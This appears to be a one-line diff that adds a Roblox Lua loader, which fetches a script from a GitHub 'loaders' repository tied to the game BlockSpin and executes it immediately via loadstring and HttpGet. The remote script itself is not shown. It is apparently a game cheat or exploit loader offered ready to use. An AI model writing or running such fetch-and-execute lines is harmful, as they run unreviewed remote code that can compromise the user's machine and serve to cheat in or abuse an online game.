@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/blockspin-halloween-update-spam3-z0uqi4yoo847st.lua"))()
